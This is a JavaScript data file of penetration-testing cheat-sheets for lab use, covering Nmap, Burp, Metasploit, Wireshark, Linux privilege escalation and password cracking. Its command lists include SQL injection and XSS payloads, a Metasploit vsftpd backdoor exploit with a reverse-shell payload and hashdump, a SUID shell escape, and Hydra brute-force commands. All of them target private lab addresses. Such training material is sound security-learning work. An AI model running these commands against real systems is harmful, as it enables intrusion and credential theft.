// Command cheat-sheets — quick step-by-step references (lab/authorized use only).
export const cheatsheets = [
  {
    id: "nmap",
    title: "Nmap — scanning & enumeration",
    icon: "📡",
    sections: [
      { title: "Discovery", commands: ["nmap -sn 192.168.56.0/24            # ping sweep (host discovery)", "nmap -Pn 192.168.56.101             # skip discovery, assume up"] },
      { title: "Port scans", commands: ["nmap -sS -p- 192.168.56.101         # full SYN scan, all 65535 ports", "nmap -sT -p 22,80,443 192.168.56.101 # TCP connect scan, few ports", "nmap --top-ports 1000 192.168.56.101 # most common 1000 ports"] },
      { title: "Fingerprinting", commands: ["nmap -sV -O 192.168.56.101          # service versions + OS guess", "nmap -A 192.168.56.101              # aggressive: OS, versions, traceroute, scripts"] },
      { title: "Scripts & output", commands: ["nmap --script http-title -p 80 192.168.56.102", "nmap --script vuln 192.168.56.101 -oA report   # save normal/xml/gnmap"] },
    ],
  },
  {
    id: "burp",
    title: "Burp Suite — web app testing",
    icon: "🕷️",
    sections: [
      { title: "Setup", commands: ["Proxy → 127.0.0.1:8080; set browser proxy to match", "Install Burp CA cert (http://burp/cert) for HTTPS interception", "Target → Site map to map the app"] },
      { title: "Manual testing", commands: ["Send request to Repeater (Ctrl+R) to iterate payloads", "SQLi test:  admin' OR '1'='1' --", "XSS test:   <img src=x onerror=alert(1)>", "IDOR test:  change ?id=1 → ?id=2 and compare responses"] },
      { title: "Automation", commands: ["Intruder (Ctrl+I): mark §param§, load wordlist, start attack", "Scanner (Pro): active scan in-scope URLs only"] },
    ],
  },
  {
    id: "metasploit",
    title: "Metasploit — exploitation workflow",
    icon: "💥",
    sections: [
      { title: "Workflow", commands: ["msfconsole -q", "search vsftpd                          # find modules", "use exploit/unix/ftp/vsftpd_234_backdoor", "show options                           # required settings", "set RHOSTS 192.168.56.101              # LAB VM ONLY", "set PAYLOAD cmd/unix/reverse", "exploit"] },
      { title: "Sessions & post", commands: ["sessions -l                            # list sessions", "sessions -i 1                          # interact", "sysinfo / getuid / ps / hashdump       # lab post-exploitation"] },
    ],
  },
  {
    id: "wireshark",
    title: "Wireshark — packet analysis",
    icon: "🦈",
    sections: [
      { title: "Capture", commands: ["sudo wireshark  (or)  sudo tcpdump -i eth0 -w lab.pcap", "tshark -r lab.pcap -Y 'http' -T fields -e http.request.full_uri"] },
      { title: "Display filters", commands: ["tcp.flags.syn==1 && tcp.flags.ack==0     # SYN scan signature", "http.request.method == \"POST\"            # form submissions", "dns.qry.name contains \"dvwa\"             # DNS for a host", "tls.handshake.type == 1                    # TLS ClientHello"] },
      { title: "Analysis", commands: ["Right-click TCP packet → Follow → TCP Stream", "Analyze → Expert Information for anomalies", "File → Export Objects → HTTP to extract files"] },
    ],
  },
  {
    id: "linux-privesc",
    title: "Linux privilege escalation",
    icon: "⬆️",
    sections: [
      { title: "Enumerate", commands: ["sudo -l                                  # allowed sudo commands", "find / -perm -4000 -type f 2>/dev/null   # SUID binaries", "cat /etc/crontab; ls -la /etc/cron.*     # cron jobs", "uname -a; cat /etc/os-release            # kernel/OS matching"] },
      { title: "Exploit", commands: ["# check GTFOBins (https://gtfobins.github.io) for the binary you found", "# e.g. SUID nmap: nmap --interactive → !sh", "id                                       # confirm root"] },
    ],
  },
  {
    id: "passwords",
    title: "Password attacks (own hashes / lab logins only)",
    icon: "🔑",
    sections: [
      { title: "Offline (your own hashes)", commands: ["echo -n 'password' | md5sum > myhash.txt", "john --wordlist=/usr/share/wordlists/rockyou.txt myhash.txt", "hashcat -m 0 -a 0 myhash.txt wordlist.txt"] },
      { title: "Online (lab login forms only)", commands: ["hydra -l labuser -P words.txt 192.168.56.101 ssh", "hydra -l admin -P words.txt 192.168.56.102 http-post-form '/login.php:u=^USER^&p=^PASS^:F=incorrect'"] },
    ],
  },
];
